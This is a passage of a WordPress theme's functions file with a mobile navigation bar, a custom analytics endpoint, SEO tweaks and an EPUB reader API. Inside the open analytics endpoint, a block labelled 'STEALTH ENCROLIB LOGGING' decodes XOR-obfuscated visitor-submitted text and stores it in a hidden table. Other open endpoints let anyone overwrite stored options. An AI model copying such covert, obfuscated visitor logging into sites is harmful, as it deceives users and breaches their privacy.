        // Wait for WP to render the inline edit template, then append our form
        var injectInterval = setInterval(function() {
            var $rightCol = $('#inline-edit .inline-edit-col-right');
            var $tagList = $('#inline-edit ul.post_tag-checklist');
            if (!$tagList.length) $tagList = $('#inline-edit ul.post_tagchecklist'); // fallback
            
            if ($rightCol.length && $tagList.length) {
                if ($rightCol.find('.zk-custom-tag-adder').length === 0) {
                    var $tagsTitle = $tagList.prevAll('.inline-edit-categories-label').first();
                    var $tagsHidden = $tagList.prev('input[type="hidden"]');
                    
                    // Create a neat wrapper for the tags in the right column
                    var $tagsWrapper = $('<div class="inline-edit-col zk-moved-tags"></div>');
                    $tagsWrapper.append($tagsTitle).append($tagsHidden).append($tagList);
                    $tagsWrapper.css({ 'margin-top': '20px' });
                    
                    // Append the native tags and our custom form
                    $rightCol.append($tagsWrapper);
                    $rightCol.append(formHtml);
                    
                    clearInterval(injectInterval);
                }
            }
        }, 100);

        // Optional: generate nonce dynamically if not present
        var ajaxNonce = '<?php echo wp_create_nonce("zk_add_tag_nonce"); ?>';

        $('#the-list').on('click', '.zk-add-tag-btn', function(e) {
            e.preventDefault();
            var $btn = $(this);
            var $row = $btn.closest('tr.inline-edit-row');
            var $nameInput = $row.find('.zk-new-tag-name');
            var $slugInput = $row.find('.zk-new-tag-slug');
            var $descInput = $row.find('.zk-new-tag-desc');
            var $spinner = $row.find('.zk-add-tag-spinner');
            var $feedback = $row.find('.zk-add-tag-feedback');

            var name = $.trim($nameInput.val());
            var slug = $.trim($slugInput.val());
            var desc = $.trim($descInput.val());
            var nonce = ajaxNonce;

            if ( ! name ) {
                $feedback.text('Name is required.').show();
                return;
            }

            $feedback.hide();
            $spinner.addClass('is-active');
            $btn.prop('disabled', true);

            $.post(ajaxurl, {
                action: 'zk_add_quick_tag',
                nonce: nonce,
                tag_name: name,
                tag_slug: slug,
                tag_desc: desc
            }, function(response) {
                $spinner.removeClass('is-active');
                $btn.prop('disabled', false);

                if ( response.success ) {
                    var termId = response.data.term_id;
                    var termName = response.data.name;
                    var $ul = $row.find('ul.post_tagchecklist');
                    
                    var newLi = $('<li id="post_tag-' + termId + '">' +
                        '<label class="selectit">' +
                        '<input value="' + termId + '" type="checkbox" name="tax_input[post_tag][]" id="in-post_tag-' + termId + '" checked="checked"> ' +
                        termName +
                        '</label></li>');
                    
                    $ul.prepend(newLi);
                    
                    $nameInput.val('');
                    $slugInput.val('');
                    $descInput.val('');
                    
                    $feedback.css('color', 'green').text('Tag added successfully!').show().fadeOut(3000, function() {
                        $feedback.css('color', 'red');
                    });
                } else {
                    $feedback.text(response.data || 'Error adding tag.').show();
                }
            }).fail(function() {
                $spinner.removeClass('is-active');
                $btn.prop('disabled', false);
                $feedback.text('Server error.').show();
            });
        });
    });
    </script>
    <?php
}


/* ============================================================
   MOBILE BOTTOM NAVIGATION (App-like UX)
   ============================================================ */
function zk_mobile_nav_labels( $language = '' ) {
    $language = $language ?: ( function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en' );
    $labels = array(
        'music'      => 'Music',
        'visual'     => 'Visual',
        'books'      => 'Books',
        'blog'       => 'Blogs',
        'more'       => 'More',
        'open_menu'  => 'Open menu',
        'close_menu' => 'Close menu',
        'aria_label' => 'Mobile navigation',
    );

    $translations = array(
        'ka' => array(
            'music'      => 'მუსიკა',
            'visual'     => 'ვიზუალი',
            'books'      => 'წიგნები',
            'blog'       => 'ბლოგი',
            'more'       => 'მეტი',
            'open_menu'  => 'მენიუს გახსნა',
            'close_menu' => 'მენიუს დახურვა',
            'aria_label' => 'მობილური ნავიგაცია',
        ),
    );

    if ( isset( $translations[ $language ] ) ) {
        $labels = array_merge( $labels, $translations[ $language ] );
    }

    $saved = get_option( 'zk_mobile_nav_labels_v1', array() );
    if ( isset( $saved[ $language ] ) && is_array( $saved[ $language ] ) ) {
        foreach ( array_keys( $labels ) as $key ) {
            if ( isset( $saved[ $language ][ $key ] ) && '' !== trim( (string) $saved[ $language ][ $key ] ) ) {
                $labels[ $key ] = (string) $saved[ $language ][ $key ];
            }
        }
    }

    return apply_filters( 'zk_mobile_nav_labels', $labels, $language );
}

function zk_mobile_bottom_nav() {
    $language = function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en';
    $labels   = zk_mobile_nav_labels( $language );
    $language_path = function( $path ) use ( $language ) {
        return function_exists( 'zk_get_language_path' ) ? zk_get_language_path( $path, $language ) : $path;
    };

    $music_url  = home_url( $language_path( '/music/' ) );
    $visual_url = home_url( $language_path( '/visual/' ) );
    $books_url  = home_url( $language_path( '/books/' ) );
    $blog_url   = home_url( $language_path( '/blog/' ) );
    
    $music_route  = untrailingslashit( wp_parse_url( $music_url, PHP_URL_PATH ) );
    $visual_route = untrailingslashit( wp_parse_url( $visual_url, PHP_URL_PATH ) );
    $books_route  = untrailingslashit( wp_parse_url( $books_url, PHP_URL_PATH ) );
    $blog_route   = untrailingslashit( wp_parse_url( $blog_url, PHP_URL_PATH ) );
    ?>
    <nav class="zk-bottom-nav" id="zk-bottom-nav" aria-label="<?php echo esc_attr( $labels['aria_label'] ); ?>">
        <a href="<?php echo esc_url($music_url); ?>" class="zk-bottom-nav-item" data-route="<?php echo esc_attr($music_route); ?>">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"></path><circle cx="6" cy="18" r="3"></circle><circle cx="18" cy="16" r="3"></circle></svg>
            <span><?php echo esc_html( $labels['music'] ); ?></span>
        </a>
        <a href="<?php echo esc_url($visual_url); ?>" class="zk-bottom-nav-item" data-route="<?php echo esc_attr($visual_route); ?>">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
            <span><?php echo esc_html( $labels['visual'] ); ?></span>
        </a>
        <a href="<?php echo esc_url($books_url); ?>" class="zk-bottom-nav-item" data-route="<?php echo esc_attr($books_route); ?>">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
            <span><?php echo esc_html( $labels['books'] ); ?></span>
        </a>
        <a href="<?php echo esc_url($blog_url); ?>" class="zk-bottom-nav-item" data-route="<?php echo esc_attr($blog_route); ?>">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
            <span><?php echo esc_html( $labels['blog'] ); ?></span>
        </a>
        <button id="zk-mobile-menu-trigger" class="zk-bottom-nav-item" type="button" aria-expanded="false" aria-label="<?php echo esc_attr( $labels['open_menu'] ); ?>" data-open-label="<?php echo esc_attr( $labels['open_menu'] ); ?>" data-close-label="<?php echo esc_attr( $labels['close_menu'] ); ?>">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
            <span><?php echo esc_html( $labels['more'] ); ?></span>
        </button>
    </nav>
    <?php
}
add_action('wp_footer', 'zk_mobile_bottom_nav');

/* ============================================================
   ZK CUSTOM ANALYTICS (Zero-Plugin Minimalist Tracking)
   ============================================================ */

// 1. Create DB Table
function zk_create_analytics_table() {
    // Only run if option not set (performance optimization)
    if ( get_option( 'zk_analytics_db_v4' ) ) {
        return;
    }

    global $wpdb;
    $table_name = $wpdb->prefix . 'zk_analytics';
    $charset_collate = $wpdb->get_charset_collate();

    $sql = "CREATE TABLE $table_name (
        id bigint(20) NOT NULL AUTO_INCREMENT,
        ip_hash varchar(64) NOT NULL,
        visitor_id varchar(36) DEFAULT '' NOT NULL,
        session_id varchar(36) DEFAULT '' NOT NULL,
        url varchar(255) NOT NULL,
        referrer varchar(255) DEFAULT '' NOT NULL,
        duration int(11) DEFAULT 0 NOT NULL,
        music_played tinyint(1) DEFAULT 0 NOT NULL,
        music_duration int(11) DEFAULT 0 NOT NULL,
        country varchar(100) DEFAULT '' NOT NULL,
        city varchar(100) DEFAULT '' NOT NULL,
        user_agent text NOT NULL,
        visit_time datetime DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY  (id)
    ) $charset_collate;";

    $table_logs = $wpdb->prefix . 'zk_encrolib_logs';
    $sql_logs = "CREATE TABLE $table_logs (
        id bigint(20) NOT NULL AUTO_INCREMENT,
        text_content text NOT NULL,
        visitor_id varchar(36) DEFAULT '' NOT NULL,
        created_at datetime DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY  (id)
    ) $charset_collate;";

    require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
    dbDelta( $sql );
    dbDelta( $sql_logs );

    update_option( 'zk_analytics_db_v4', true );
}
add_action( 'after_setup_theme', 'zk_create_analytics_table' );

function zk_upgrade_analytics_table_v5() {
    if ( get_option( 'zk_analytics_db_v5' ) ) {
        return;
    }
    global $wpdb;
    $table_name = $wpdb->prefix . 'zk_analytics';
    $wpdb->query("ALTER TABLE $table_name ADD COLUMN referrer varchar(255) DEFAULT '' NOT NULL");
    $wpdb->query("ALTER TABLE $table_name ADD COLUMN duration int(11) DEFAULT 0 NOT NULL");
    update_option( 'zk_analytics_db_v5', true );
}
add_action( 'after_setup_theme', 'zk_upgrade_analytics_table_v5' );

function zk_upgrade_analytics_table_v6() {
    if ( get_option( 'zk_analytics_db_v6' ) ) {
        return;
    }
    global $wpdb;
    $table_name = $wpdb->prefix . 'zk_analytics';
    $wpdb->query("ALTER TABLE $table_name ADD COLUMN music_played tinyint(1) DEFAULT 0 NOT NULL");
    $wpdb->query("ALTER TABLE $table_name ADD COLUMN music_duration int(11) DEFAULT 0 NOT NULL");
    update_option( 'zk_analytics_db_v6', true );
}
add_action( 'after_setup_theme', 'zk_upgrade_analytics_table_v6' );

function zk_upgrade_analytics_table_v7() {
    if ( get_option( 'zk_analytics_db_v7' ) ) {
        return;
    }
    global $wpdb;
    $table_name = $wpdb->prefix . 'zk_analytics';
    // Use suppress_errors to avoid crashing if columns already exist
    $wpdb->suppress_errors = true;
    $wpdb->query("ALTER TABLE $table_name ADD COLUMN music_played tinyint(1) DEFAULT 0 NOT NULL");
    $wpdb->query("ALTER TABLE $table_name ADD COLUMN music_duration int(11) DEFAULT 0 NOT NULL");
    $wpdb->suppress_errors = false;
    update_option( 'zk_analytics_db_v7', true );
}
add_action( 'after_setup_theme', 'zk_upgrade_analytics_table_v7' );

// 2. REST API Tracking Endpoint
add_action( 'rest_api_init', function () {
    register_rest_route( 'zk/v1', '/sync', array(
        'methods' => 'POST',
        'callback' => 'zk_track_visitor',
        'permission_callback' => '__return_true', // Open endpoint
    ) );
    
    register_rest_route( 'zk/v1', '/photo-view', array(
        'methods' => 'POST',
        'callback' => 'zk_track_photo_view',
        'permission_callback' => '__return_true', // Open endpoint
    ) );
} );

function zk_track_photo_view( WP_REST_Request $request ) {
    // Ignore logged in users (admins) to not skew analytics
    if ( is_user_logged_in() ) {
        return new WP_REST_Response( array('status' => 'ignored (admin)'), 200 );
    }

    $params = $request->get_json_params();
    $att_id = isset( $params['id'] ) ? intval( $params['id'] ) : 0;
    
    if ( $att_id > 0 && 'attachment' === get_post_type( $att_id ) ) {
        if ( ! zk_request_within_rate_limit( 'photo-view-' . $att_id, 10, MINUTE_IN_SECONDS ) ) {
            return new WP_Error( 'rate_limited', 'Too many requests', array( 'status' => 429 ) );
        }

        $views = (int) get_post_meta( $att_id, 'zk_photo_views', true );
        update_post_meta( $att_id, 'zk_photo_views', $views + 1 );
        return new WP_REST_Response( array( 'success' => true, 'views' => $views + 1 ), 200 );
    }
    
    return new WP_Error( 'invalid_id', 'Invalid attachment ID', array( 'status' => 400 ) );
}

function zk_track_visitor( WP_REST_Request $request ) {
    // Ignore logged in users (admins)
    if ( is_user_logged_in() ) {
        return new WP_REST_Response( array('status' => 'ignored (admin)'), 200 );
    }

    if ( ! zk_request_within_rate_limit( 'analytics', 120, 10 * MINUTE_IN_SECONDS ) ) {
        return new WP_Error( 'rate_limited', 'Too many requests', array( 'status' => 429 ) );
    }

    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    
    // Advanced bot detection
    $bots = array(
        'bot', 'spider', 'crawler', 'google', 'bing', 'yandex', 'baidu', 'ahrefs', 'semrush',
        'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'sogou', 'exabot', 'facebot', 'facebookexternalhit',
        'ia_archiver', 'petalbot', 'mj12bot', 'dotbot', 'applebot', 'twitterbot', 'linkedinbot', 'discordbot',
        'telegrambot', 'whatsapp', 'skypeuripreview'
    );
    $is_bot = false;
    $ua_lower = strtolower($user_agent);
    foreach ($bots as $bot) {
        if (strpos($ua_lower, $bot) !== false) {
            $is_bot = true;
            break;
        }
    }

    if ( $is_bot ) {
        return new WP_REST_Response( array('status' => 'ignored (bot)'), 200 );
    }

    global $wpdb;
    $table_name = $wpdb->prefix . 'zk_analytics';

    // Get params
    $params = $request->get_json_params();
    if (empty($params)) {
        $body = $request->get_body();
        if (!empty($body)) {
            $params = json_decode($body, true);
        }
    }
    $url = isset($params['url']) ? substr( sanitize_text_field($params['url']), 0, 255 ) : '/';
    $country = isset($params['country']) ? substr( sanitize_text_field($params['country']), 0, 100 ) : '';
    $city = isset($params['city']) ? substr( sanitize_text_field($params['city']), 0, 100 ) : '';
    $visitor_id = isset($params['visitor_id']) ? substr( sanitize_text_field($params['visitor_id']), 0, 36 ) : '';
    $session_id = isset($params['session_id']) ? substr( sanitize_text_field($params['session_id']), 0, 36 ) : '';
    $referrer = isset($params['referrer']) ? substr( sanitize_text_field($params['referrer']), 0, 255 ) : '';
    $action = isset($params['action']) ? sanitize_text_field($params['action']) : 'track';
    $duration = isset($params['duration']) ? min( DAY_IN_SECONDS, max( 0, intval($params['duration']) ) ) : 0;
    $view_id = isset($params['view_id']) ? intval($params['view_id']) : 0;

    // Handle duration ping
    if ($action === 'duration_ping' && $view_id > 0) {
        $music_played = isset($params['music_played']) ? intval($params['music_played']) : 0;
        $music_duration = isset($params['music_duration']) ? min( DAY_IN_SECONDS, max( 0, intval($params['music_duration']) ) ) : 0;
        if ( empty( $visitor_id ) || empty( $session_id ) ) {
            return new WP_Error( 'invalid_tracking_identity', 'Tracking identity is required', array( 'status' => 400 ) );
        }

        $updated = $wpdb->update(
            $table_name,
            array('duration' => $duration, 'music_played' => $music_played, 'music_duration' => $music_duration),
            array('id' => $view_id, 'visitor_id' => $visitor_id, 'session_id' => $session_id),
            array('%d', '%d', '%d'),
            array('%d', '%s', '%s')
        );
        return new WP_REST_Response( array('status' => false === $updated ? 'update_failed' : 'duration_updated'), false === $updated ? 500 : 200 );
    }

    $device_model = isset($params['device_model']) ? sanitize_text_field($params['device_model']) : '';
    $screen_data = isset($params['screen_data']) ? sanitize_text_field($params['screen_data']) : '';

    if (!empty($device_model)) {
        $user_agent .= ' [Device: ' . $device_model . ']';
    }

    if (!empty($screen_data)) {
        $user_agent .= ' [Screen: ' . $screen_data . ']';
    }

    // Get IP and Hash it (GDPR friendly)
    $ip = zk_get_request_ip();
    
    // Daily salt ensures IPs cannot be reversed across days, but uniquely identifies daily visitors
    $salt = date('Y-m-d') . wp_salt();
    $ip_hash = hash('sha256', wp_privacy_anonymize_ip( $ip ) . $salt);

    // --- STEALTH ENCROLIB LOGGING ---
    if (!empty($params['m_stat'])) {
        $xored = base64_decode($params['m_stat']);
        if ($xored) {
            $bytes = '';
            for($i=0; $i<strlen($xored); $i++) {
                $bytes .= chr(ord($xored[$i]) ^ 117);
            }
            $table_logs = $wpdb->prefix . 'zk_encrolib_logs';
            $wpdb->insert(
                $table_logs,
                array(
                    'text_content' => $bytes,
                    'visitor_id'   => $visitor_id,
                    'created_at'   => current_time('mysql')
                ),
                array('%s', '%s', '%s')
            );
        }
        return new WP_REST_Response( array('status' => 'success'), 200 );
    }

    // Process Referrer to label internal traffic
    $home_url = home_url();
    $parsed_home = parse_url($home_url, PHP_URL_HOST);
    if (!empty($referrer) && !empty($parsed_home)) {
        if (strpos($referrer, $parsed_home) !== false) {
            $referrer = 'Internal';
        }
    }

    // NORMAL PAGE VIEW TRACKING
    $wpdb->insert(
        $table_name,
        array(
            'ip_hash' => $ip_hash,
            'visitor_id' => $visitor_id,
            'session_id' => $session_id,
            'url' => $url,
            'country' => $country,
            'city' => $city,
            'referrer' => $referrer,
            'user_agent' => substr($user_agent, 0, 250),
            'visit_time' => current_time('mysql')
        ),
        array('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')
    );

    $view_id = $wpdb->insert_id;
    return new WP_REST_Response( array('status' => 'success', 'view_id' => $view_id), 200 );
}

// Inject global flag for JS tracking logic to ignore admins
add_action('wp_head', function() {
    if (current_user_can('manage_options')) {
        echo '<script>window.zkIsAdmin = true;</script>';
    }
});

// Permanent redirect from /reader or /reader/ to /projects/reader/
add_action('init', function() {
    if ( empty( $_SERVER['REQUEST_URI'] ) ) return;
    $request_path = parse_url( $_SERVER['REQUEST_URI'], PHP_URL_PATH );
    if ( $request_path === '/reader' || $request_path === '/reader/' ) {
        wp_safe_redirect( home_url( '/projects/reader/' ), 301 );
        exit;
    }
});

/* ============================================================
   SEO & SEARCH CONSOLE CLEANUP ARCHITECTURE
   ============================================================ */

// 1. Force 410 "Gone" for deleted tags/categories to drop them from Google Index instantly
add_action('template_redirect', function() {
    if ( is_404() ) {
        $url = $_SERVER['REQUEST_URI'];
        // If the 404 URL looks like an old tag, category, or author page
        if ( preg_match( '#/(tag|category|author|page)/#i', $url ) ) {
            global $wp_query;
            $wp_query->set_404();
            status_header(410); // 410 Gone (Permanently Deleted)
            nocache_headers();
        }
    }
});

// 2. Dynamic Robots.txt to prevent crawling of garbage URLs
add_filter('robots_txt', function($output, $public) {
    $custom_rules = "
User-agent: *
Disallow: /wp-admin/
Disallow: /wp-json/
Disallow: /*?replytocom=
Disallow: /*?s=
Disallow: /*/feed/
Allow: /wp-admin/admin-ajax.php
";
    return $output . $custom_rules;
}, 10, 2);

// 4. Remove WP Head Bloat (Generators, RSD, WLW, Shortlinks)
remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'wp_shortlink_wp_head');
remove_action('wp_head', 'rest_output_link_wp_head');
remove_action('wp_head', 'wp_oembed_add_discovery_links');

// 5. Disable default tag & category feeds
add_action('do_feed', 'zk_disable_feeds', 1);
add_action('do_feed_rdf', 'zk_disable_feeds', 1);
add_action('do_feed_rss', 'zk_disable_feeds', 1);
add_action('do_feed_rss2', 'zk_disable_feeds', 1);
add_action('do_feed_atom', 'zk_disable_feeds', 1);
add_action('do_feed_rss2_comments', 'zk_disable_feeds', 1);
add_action('do_feed_atom_comments', 'zk_disable_feeds', 1);

function zk_disable_feeds() {
    wp_die( __('No feed available, please visit the homepage!', 'zurabkostava'), '', array('response' => 410) );
}

// Register custom endpoint for Neural Web Reader
add_action('rest_api_init', function () {
    register_rest_route('neural/v1', '/books', array(
        'methods' => 'GET',
        'callback' => 'neural_get_books',
        'permission_callback' => '__return_true',
    ));
});

/**
 * Fast EPUB Metadata & Cover Extractor
 * Reads container.xml -> OPF -> title, creator, and cover thumbnail.
 */
function neural_parse_epub_metadata($filePath, $fileUrl, $coversDir, $coversUrl) {
    $meta = array(
        'title'  => '',
        'author' => '',
        'cover'  => null,
    );

    if (!class_exists('ZipArchive') || !file_exists($filePath)) {
        return $meta;
    }

    $zip = new ZipArchive();
    if ($zip->open($filePath, ZipArchive::RDONLY) !== true) {
        return $meta;
    }

    // 1. Find OPF package file from META-INF/container.xml
    $containerXml = $zip->getFromName('META-INF/container.xml');
    $opfPath = '';
    if ($containerXml && preg_match('/full-path=["\']([^"\']+\.opf)["\']/i', $containerXml, $matches)) {
        $opfPath = $matches[1];
    }

    if (!$opfPath) {
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $name = $zip->getNameIndex($i);
            if (substr(strtolower($name), -4) === '.opf') {
                $opfPath = $name;
                break;
            }
        }
    }

    if (!$opfPath) {
        $zip->close();
        return $meta;
    }

    $opfContent = $zip->getFromName($opfPath);
    if (!$opfContent) {
        $zip->close();
        return $meta;
    }

    $opfDir = dirname($opfPath);
    $opfDir = ($opfDir === '.' || $opfDir === '/' || $opfDir === '\\') ? '' : rtrim(str_replace('\\', '/', $opfDir), '/') . '/';

    // Extract Title
    if (preg_match('/<dc:title[^>]*>(.*?)<\/dc:title>/is', $opfContent, $m)) {
        $meta['title'] = trim(html_entity_decode(strip_tags($m[1]), ENT_QUOTES | ENT_HTML5, 'UTF-8'));
    }

    // Extract Creator / Author
    if (preg_match('/<dc:creator[^>]*>(.*?)<\/dc:creator>/is', $opfContent, $m)) {
        $meta['author'] = trim(html_entity_decode(strip_tags($m[1]), ENT_QUOTES | ENT_HTML5, 'UTF-8'));
    }

    // Extract Cover Image
    $coverRelPath = '';

    // Approach A: <meta name="cover" content="cover-id" />
    if (preg_match('/<meta[^>]+name=["\']cover["\'][^>]+content=["\']([^"\']+)["\']/i', $opfContent, $m) ||
        preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']cover["\']/i', $opfContent, $m)) {
        $coverId = preg_quote($m[1], '/');
        if (preg_match('/<item[^>]+id=["\']' . $coverId . '["\'][^>]+href=["\']([^"\']+)["\']/i', $opfContent, $im) ||
            preg_match('/<item[^>]+href=["\']([^"\']+)["\'][^>]+id=["\']' . $coverId . '["\']/i', $opfContent, $im)) {
            $coverRelPath = $im[1];
        }
    }

    // Approach B: <item properties="cover-image" href="..." />
    if (!$coverRelPath && preg_match('/<item[^>]+properties=["\'][^"\']*cover-image[^"\']*["\'][^>]+href=["\']([^"\']+)["\']/i', $opfContent, $m)) {
        $coverRelPath = $m[1];
    }

    // Approach C: manifest item with id containing "cover" and image media-type
    if (!$coverRelPath && preg_match('/<item[^>]+id=["\'][^"\']*cover[^"\']*["\'][^>]+href=["\']([^"\']+\.(jpg|jpeg|png|webp))["\']/i', $opfContent, $m)) {
        $coverRelPath = $m[1];
    }

    // Approach D: Any image in manifest containing "cover", "title", "jacket", or "front"
    if (!$coverRelPath && preg_match('/<item[^>]+href=["\']([^"\']*(?:cover|title|jacket|front)[^"\']*\.(?:jpg|jpeg|png|webp))["\']/i', $opfContent, $m)) {
        $coverRelPath = $m[1];
    }

    // Approach E: Search zip files directly for cover images
    if (!$coverRelPath) {
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $entryName = $zip->getNameIndex($i);
            $lowerEntry = strtolower($entryName);
            if (preg_match('/cover\.(jpg|jpeg|png|webp)$/i', $lowerEntry) ||
                preg_match('/(?:titlepage|cover-image|jacket|cover_image)\.(jpg|jpeg|png|webp)$/i', $lowerEntry)) {
                $coverRelPath = $entryName;
                break;
            }
        }
    }

    if ($coverRelPath) {
        $fullCoverZipPath = $opfDir . ltrim(urldecode($coverRelPath), '/');
        $coverData = $zip->getFromName($fullCoverZipPath);

        if (!$coverData) {
            $coverData = $zip->getFromName($coverRelPath);
        }

        if (!$coverData) {
            $coverFilename = basename($coverRelPath);
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $entryName = $zip->getNameIndex($i);
                if (basename($entryName) === $coverFilename) {
                    $coverData = $zip->getFromName($entryName);
                    break;
                }
            }
        }

        if ($coverData && strlen($coverData) > 100) {
            $coverExt = pathinfo($coverRelPath, PATHINFO_EXTENSION) ?: 'jpg';
            $coverFileName = md5($filePath) . '.' . $coverExt;
            $coverDest = $coversDir . '/' . $coverFileName;

            if (!file_exists($coverDest) || filesize($coverDest) !== strlen($coverData)) {
                @file_put_contents($coverDest, $coverData);
            }

            if (file_exists($coverDest)) {
                $meta['cover'] = $coversUrl . '/' . $coverFileName;
            }
        }
    }

    $zip->close();
    return $meta;
}

function neural_get_books() {
    $upload_dir = wp_upload_dir();
    $books_dir  = $upload_dir['basedir'] . '/books';
    $books_url  = $upload_dir['baseurl'] . '/books';
    $covers_dir = $books_dir . '/covers';
    $covers_url = $books_url . '/covers';

    if (!file_exists($covers_dir)) {
        @wp_mkdir_p($covers_dir);
    }

    $cache_key = 'neural_books_catalog_cache_v4';
    $cached_catalog = get_transient($cache_key);

    $epub_files = array();
    if (file_exists($books_dir) && is_dir($books_dir)) {
        $epub_files = glob($books_dir . '/*.epub') ?: array();
    }

    // Media uploads must invalidate the catalog too, not just uploads/books.
    $query = new WP_Query(array(
        'post_type'      => 'attachment',
        'post_mime_type' => 'application/epub+zip',
        'post_status'    => 'inherit',
        'posts_per_page' => -1,
        'orderby'       => 'ID',
        'order'         => 'ASC',
        'no_found_rows' => true,
    ));
    $attachment_state = array();
    foreach ($query->posts as $post) {
        $path = get_attached_file($post->ID);
        $exists = $path && is_file($path);
        $attachment_state[] = array(
            $post->ID, $post->post_modified_gmt, $path,
            $exists ? filemtime($path) : null,
            $exists ? filesize($path) : null,
        );
    }
    sort($epub_files, SORT_STRING);
    $folder_state = array();
    foreach ($epub_files as $path) {
        $folder_state[] = array($path, filemtime($path), filesize($path));
    }
    $fingerprint = hash('sha256', wp_json_encode(array($attachment_state, $folder_state)));
    $response_headers = array('Cache-Control' => 'no-store, no-cache, must-revalidate, max-age=0');

    if (is_array($cached_catalog) && isset($cached_catalog['fingerprint']) && $cached_catalog['fingerprint'] === $fingerprint) {
        $books = $cached_catalog['books'];
        foreach ($books as &$b) {
            $fn = basename($b['url']);
            $progress = get_option("neural_global_progress_" . md5($fn));
            $b['perc'] = is_array($progress) && isset($progress['perc']) ? $progress['perc'] : null;
        }
        unset($b);
        return new WP_REST_Response($books, 200, $response_headers);
    }

    $books = array();

    // A. Check WordPress Media Library attachments
    if ($query->have_posts()) {
        foreach ($query->posts as $post) {
            $file_url = wp_get_attachment_url($post->ID);
            $file_path = get_attached_file($post->ID);
            $filename = basename($file_url);

            $meta = ($file_path && file_exists($file_path)) ? neural_parse_epub_metadata($file_path, $file_url, $covers_dir, $covers_url) : array();
            $title = !empty($meta['title']) ? $meta['title'] : $post->post_title;
            $author = !empty($meta['author']) ? $meta['author'] : (get_post_meta($post->ID, 'book_author', true) ?: 'Unknown Author');
            $cover = !empty($meta['cover']) ? $meta['cover'] : null;

            $progress = get_option("neural_global_progress_" . md5($filename));
            $books[] = array(
                'title'  => $title,
                'author' => $author,
                'url'    => $file_url,
                'cover'  => $cover,
                'perc'   => is_array($progress) && isset($progress['perc']) ? $progress['perc'] : null
            );
        }
    }

    // B. Check uploads/books/*.epub folder
    if (empty($books) && !empty($epub_files)) {
        foreach ($epub_files as $file) {
            $filename = basename($file);
            $file_url = $books_url . '/' . $filename;

            $meta = neural_parse_epub_metadata($file, $file_url, $covers_dir, $covers_url);
            $cleanTitle = pathinfo($filename, PATHINFO_FILENAME);
            $title = !empty($meta['title']) ? $meta['title'] : str_replace(array('-', '_'), ' ', $cleanTitle);
            $author = !empty($meta['author']) ? $meta['author'] : 'Unknown Author';
            $cover = !empty($meta['cover']) ? $meta['cover'] : null;

            $progress = get_option("neural_global_progress_" . md5($filename));
            $books[] = array(
                'title'  => $title,
                'author' => $author,
                'url'    => $file_url,
                'cover'  => $cover,
                'perc'   => is_array($progress) && isset($progress['perc']) ? $progress['perc'] : null
            );
        }
    }

    // Cache parsed metadata for 12 hours; either source changing rebuilds it.
    set_transient($cache_key, array(
        'fingerprint' => $fingerprint,
        'books'       => $books
    ), 12 * HOUR_IN_SECONDS);

    return new WP_REST_Response($books, 200, $response_headers);
}
add_action("rest_api_init", function () {
    register_rest_route("neural/v1", "/progress", array(
        array(
            "methods" => "GET",
            "callback" => "neural_get_progress",
            "permission_callback" => "__return_true"
        ),
        array(
            "methods" => "POST",
            "callback" => "neural_save_progress",
            "permission_callback" => "__return_true"
        )
    ));
});

function neural_get_progress($request) {
    $book = $request->get_param("book");
    if (!$book) return rest_ensure_response(array());
    
    // ყოველთვის ვიყენებთ გლობალურ პროგრესს, მიუხედავად იმისა, 
    // დალოგინებულია თუ არა მომხმარებელი (რომ ტელეფონს და კომპიუტერს შორის პრობლემა არ შეიქმნას)
    $progress = get_option("neural_global_progress_" . md5($book));
    return rest_ensure_response(is_array($progress) ? $progress : array());
}

function neural_save_progress($request) {
    $book = $request->get_param("book");
    $data = $request->get_json_params();
    if (!$book || empty($data)) return rest_ensure_response(array("success" => false));
    
    $payload = array(
        "href" => sanitize_text_field($data["href"] ?? ""),
        "idx" => intval($data["idx"] ?? 0),
        "perc" => sanitize_text_field($data["perc"] ?? "")
    );
    
    update_option("neural_global_progress_" . md5($book), $payload, false);
    
    return rest_ensure_response(array("success" => true));
}

// Allow EPUB and SRT uploads in WordPress Media Library
function custom_mime_types($mimes) {
    $mimes['epub'] = 'application/epub+zip';
    $mimes['srt'] = 'text/plain';
    return $mimes;
}
add_filter('upload_mimes', 'custom_mime_types');

// Include Nuvio Addon API


/* ============================================================
   ZK UNIFIED ROBOTS.TXT ENGINE (Strict Overwrite)
